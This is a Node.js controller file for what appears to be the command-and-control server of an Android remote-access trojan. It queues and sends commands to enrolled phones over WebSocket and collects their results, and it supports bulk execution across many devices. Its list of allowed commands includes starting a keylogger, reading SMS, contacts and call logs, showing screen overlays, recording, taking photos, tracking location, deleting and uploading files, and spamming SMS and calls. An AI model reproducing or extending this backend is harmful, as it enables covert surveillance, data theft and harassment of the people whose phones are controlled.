const Device = require('../models/Device');
const Command = require('../models/Command');
const CommandResponse = require('../models/CommandResponse');
const { v4: uuidv4 } = require('uuid');
const { sendToDevice } = require('../services/websocketService');
const { logger } = require('../utils/logger');
const { cache } = require('../config/redis');

// Execute command on device
const executeCommand = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { commandType, params } = req.body;
    const userId = req.user._id;

    // Validate command type
    const validCommands = [
      'OPEN_WEB', 'TAKE_PHOTO', 'START_KEYLOGGER', 'STOP_KEYLOGGER',
      'GET_LOCATION', 'LOCK_DEVICE', 'UNLOCK_DEVICE', 'SHOW_OVERLAY',
      'HIDE_OVERLAY', 'SEND_NOTIFICATION', 'MAKE_CALL', 'SEND_SMS',
      'SPAM_SMS', 'SPAM_CALL', 'SEND_WHATSAPP', 'SET_BRIGHTNESS',
      'SET_VOLUME', 'SET_SILENT_MODE', 'TOGGLE_WIFI', 'TOGGLE_BLUETOOTH',
      'TOGGLE_AIRPLANE_MODE', 'VIBRATE', 'SHOW_TOAST', 'TEXT_TO_SPEECH',
      'SET_WALLPAPER', 'PLAY_MUSIC', 'GET_SMS', 'GET_CONTACTS',
      'GET_CALL_LOGS', 'GET_INSTALLED_APPS', 'GET_BATTERY_INFO',
      'GET_DEVICE_INFO', 'REBOOT_DEVICE', 'SHUTDOWN_DEVICE',
      'TAKE_SCREENSHOT', 'START_RECORDING', 'STOP_RECORDING',
      'DELETE_FILE', 'LIST_FILES', 'DOWNLOAD_FILE', 'UPLOAD_FILE'
    ];

    if (!validCommands.includes(commandType)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid command type'
      });
    }

    // Check if device exists and belongs to user
    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    // Check if device is online
    if (!device.isOnline) {
      return res.status(400).json({
        success: false,
        error: 'Device is offline'
      });
    }

    // Generate command ID
    const commandId = uuidv4();

    // Create command record
    const command = new Command({
      commandId,
      deviceId,
      userId,
      type: commandType,
      params,
      status: 'pending',
      createdAt: new Date(),
      expiresAt: new Date(Date.now() + 5 * 60 * 1000) // 5 minutes expiry
    });

    await command.save();

    // Add to device command queue
    device.commandQueue.push({
      commandId,
      type: commandType,
      params,
      status: 'pending',
      createdAt: new Date(),
      expiresAt: new Date(Date.now() + 5 * 60 * 1000)
    });
    await device.save();

    // Send command to device via WebSocket
    const sent = sendToDevice(deviceId, 'execute_command', {
      commandId,
      type: commandType,
      params,
      timestamp: new Date().toISOString()
    });

    if (!sent) {
      command.status = 'failed';
      command.error = 'Device not connected';
      await command.save();
      
      return res.status(400).json({
        success: false,
        error: 'Device not connected'
      });
    }

    // Update command status
    command.status = 'sent';
    command.sentAt = new Date();
    await command.save();

    // Add audit log
    await req.user.addAuditLog('EXECUTE_COMMAND', 'Command', commandId, { commandType, params }, req);

    res.json({
      success: true,
      message: 'Command sent successfully',
      data: {
        commandId,
        status: 'sent'
      }
    });
  } catch (error) {
    logger.error('Execute command error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Get command status
const getCommandStatus = async (req, res) => {
  try {
    const { commandId } = req.params;
    const userId = req.user._id;

    const command = await Command.findOne({ commandId, userId });
    if (!command) {
      return res.status(404).json({
        success: false,
        error: 'Command not found'
      });
    }

    res.json({
      success: true,
      data: {
        commandId: command.commandId,
        type: command.type,
        status: command.status,
        result: command.result,
        error: command.error,
        createdAt: command.createdAt,
        sentAt: command.sentAt,
        executedAt: command.executedAt,
        completedAt: command.completedAt
      }
    });
  } catch (error) {
    logger.error('Get command status error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Get command history
const getCommandHistory = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;
    const { limit = 50, page = 1, type, status } = req.query;

    const query = { deviceId, userId };
    if (type) query.type = type;
    if (status) query.status = status;

    const skip = (parseInt(page) - 1) * parseInt(limit);
    const commands = await Command.find(query)
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(parseInt(limit));

    const total = await Command.countDocuments(query);

    res.json({
      success: true,
      data: commands,
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        total,
        pages: Math.ceil(total / parseInt(limit))
      }
    });
  } catch (error) {
    logger.error('Get command history error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Cancel pending command
const cancelCommand = async (req, res) => {
  try {
    const { commandId } = req.params;
    const userId = req.user._id;

    const command = await Command.findOne({ commandId, userId });
    if (!command) {
      return res.status(404).json({
        success: false,
        error: 'Command not found'
      });
    }

    if (command.status !== 'pending') {
      return res.status(400).json({
        success: false,
        error: `Cannot cancel command with status: ${command.status}`
      });
    }

    command.status = 'cancelled';
    await command.save();

    // Remove from device queue
    await Device.findOneAndUpdate(
      { deviceId: command.deviceId },
      { $pull: { commandQueue: { commandId } } }
    );

    res.json({
      success: true,
      message: 'Command cancelled successfully'
    });
  } catch (error) {
    logger.error('Cancel command error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Receive command result (called by device via WebSocket)
const receiveCommandResult = async (req, res) => {
  try {
    const { commandId, deviceId, status, result, error } = req.body;

    const command = await Command.findOne({ commandId, deviceId });
    if (!command) {
      return res.status(404).json({
        success: false,
        error: 'Command not found'
      });
    }

    command.status = status;
    if (result) command.result = result;
    if (error) command.error = error;
    command.executedAt = new Date();
    if (status === 'completed' || status === 'failed') {
      command.completedAt = new Date();
    }
    await command.save();

    // Update device queue
    await Device.findOneAndUpdate(
      { deviceId },
      { 
        $set: { 
          'commandQueue.$[elem].status': status,
          'commandQueue.$[elem].result': result,
          'commandQueue.$[elem].error': error,
          'commandQueue.$[elem].executedAt': new Date(),
          'commandQueue.$[elem].completedAt': new Date()
        }
      },
      { arrayFilters: [{ 'elem.commandId': commandId }] }
    );

    // Create command response record
    const response = new CommandResponse({
      commandId,
      deviceId,
      status,
      result,
      error,
      receivedAt: new Date()
    });
    await response.save();

    res.json({
      success: true,
      message: 'Command result received'
    });
  } catch (error) {
    logger.error('Receive command result error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Bulk execute commands
const bulkExecuteCommands = async (req, res) => {
  try {
    const { deviceIds, commandType, params } = req.body;
    const userId = req.user._id;

    if (!deviceIds || !Array.isArray(deviceIds) || deviceIds.length === 0) {
      return res.status(400).json({
        success: false,
        error: 'Device IDs array is required'
      });
    }

    const results = [];
    const errors = [];

    for (const deviceId of deviceIds) {
      try {
        const device = await Device.findOne({ deviceId, userId });
        if (!device) {
          errors.push({ deviceId, error: 'Device not found' });
          continue;
        }

        if (!device.isOnline) {
          errors.push({ deviceId, error: 'Device is offline' });
          continue;
        }

        const commandId = uuidv4();
        const command = new Command({
          commandId,
          deviceId,
          userId,
          type: commandType,
          params,
          status: 'pending',
          createdAt: new Date()
        });
        await command.save();

        const sent = sendToDevice(deviceId, 'execute_command', {
          commandId,
          type: commandType,
          params,
          timestamp: new Date().toISOString()
        });

        if (!sent) {
          command.status = 'failed';
          command.error = 'Device not connected';
          await command.save();
          errors.push({ deviceId, error: 'Device not connected' });
        } else {
          command.status = 'sent';
          command.sentAt = new Date();
          await command.save();
          results.push({ deviceId, commandId, status: 'sent' });
        }
      } catch (error) {
        errors.push({ deviceId, error: error.message });
      }
    }

    res.json({
      success: true,
      data: {
        successful: results,
        failed: errors,
        total: deviceIds.length,
        successCount: results.length,
        failedCount: errors.length
      }
    });
  } catch (error) {
    logger.error('Bulk execute commands error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

module.exports = {
  executeCommand,
  getCommandStatus,
  getCommandHistory,
  cancelCommand,
  receiveCommandResult,
  bulkExecuteCommands
};
